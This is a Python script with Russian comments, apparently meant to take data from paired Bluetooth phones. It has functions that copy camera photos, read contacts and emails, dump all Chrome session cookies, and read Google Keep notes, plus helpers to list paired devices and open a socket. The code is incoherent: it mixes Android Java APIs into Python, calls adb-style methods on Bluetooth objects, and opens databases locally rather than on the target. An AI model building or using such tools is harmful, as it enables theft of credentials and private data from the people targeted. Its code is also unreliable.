from android.bluetooth import BluetoothAdapter, BluetoothDevice
import os
import sqlite3
import time

# функция для извлечения фотографий
def extract_photos(device, save_dir):
    print("Extracting photos...")

    # получаем список файлов в директории DCIM/Camera на устройстве
    cmd = 'ls /storage/emulated/0/DCIM/Camera/*.jpeg /storage/emulated/0/DCIM/Camera/*.png /storage/emulated/0/DCIM/Camera/*.heic'
    files = device.shell(cmd).split("\n")[:-1]

    # копируем файлы на Android-устройство
    for file in files:
        file_name = os.path.basename(file)
        local_path = os.path.join(save_dir, file_name)
        device.pull(file, local_path)

    print("Photos extracted to", save_dir)

# функция для извлечения контактов
def extract_contacts(device):
    print("Extracting contacts...")

    # подключаемся к базе данных контактов
    contacts_db = '/data/data/com.android.providers.contacts/databases/contacts2.db'
    conn = sqlite3.connect(contacts_db)
    cursor = conn.cursor()

    # извлекаем имя и номер телефона контакта
    cursor.execute('SELECT display_name, data1 FROM view_data WHERE mimetype_id=5')
    contacts = cursor.fetchall()

    # извлекаем электронные адреса контактов
    cursor.execute('SELECT display_name, data1 FROM view_data WHERE mimetype_id=4')
    emails = cursor.fetchall()

    conn.close()

    print("Contacts extracted:")
    for contact in contacts:
        print("  ", contact[0], ",", contact[1])
    for email in emails:
        print("  ", email[0], ",", email[1])
# функция для извлечения cookies
def extract_cookies(device):
    print("Extracting cookies...")

    # получение пути к базе данных браузера Google Chrome
    cookies_db = "/data/data/com.android.chrome/app_chrome/Default/Cookies"

    # подключение к базе данных и получение курсора
    conn = sqlite3.connect(cookies_db)
    cursor = conn.cursor()

    # извлечение cookies из базы данных
    cursor.execute("SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, last_access_utc FROM cookies")
    cookies = cursor.fetchall()

    conn.close()

    # вывод извлеченных cookies
    print("Cookies extracted:")
    for cookie in cookies:
        print("  ", cookie[0], ",", cookie[1], ",", cookie[2], ",", cookie[3], ",", cookie[4], ",", cookie[5], ",", cookie[6], ",", cookie[7])

# извлечение заметок из приложения Google Keep
def extract_notes(device):
    print("Extracting notes...")

    # получение пути к базе данных приложения Google Keep
    notes_db = "/data/data/com.google.android.keep/databases/notes.db"

    # подключение к базе данных и получение курсора
    conn = sqlite3.connect(notes_db)
    cursor = conn.cursor()

    # извлечение заголовка и содержимого заметок
    cursor.execute("SELECT title, content FROM node")
    notes = cursor.fetchall()

    conn.close()

    # вывод извлеченных заметок
    print("Notes extracted:")
    for note in notes:
        print("  ", note[0], ",", note[1])

# получение Bluetooth адаптера и списка устройств
def get_devices():
    # получение Bluetooth адаптера
    adapter = BluetoothAdapter.getDefaultAdapter()

    # проверка, что адаптер не равен None
    if adapter:
        # получение списка устройств
        devices = adapter.getBondedDevices().toArray()

        # вывод списка устройств
        print("Paired Devices:")
        for device in devices:
            print("  ", device.getName(), ",", device.getAddress())

        return devices

    else:
        print("Bluetooth adapter not available.")

        return None
# подключение к выбранному Bluetooth-устройству
def connect_device(device_address):
    # получение Bluetooth адаптера
    adapter = BluetoothAdapter.getDefaultAdapter()

    # получение устройства по его адресу MAC
    device = adapter.getRemoteDevice(device_address)

    # подключение к устройству
    print("Connecting to", device.getName(), "...")
    socket = device.createRfcommSocketToServiceRecord(device.getUuids()[0].getUuid())
    socket.connect()

    print("Connected to", device.getName())

    return socket

# получение данных из Bluetooth-устройства
def receive_data(socket):
    # установка таймаута
    socket.settimeout(5.0)

    # получение данных от устройства
    try:
        data = socket.recv(1024).decode('utf-8')
        print("Received data:", data)
        return data
    except:
        print("Timeout occurred, no data received.")
        return None
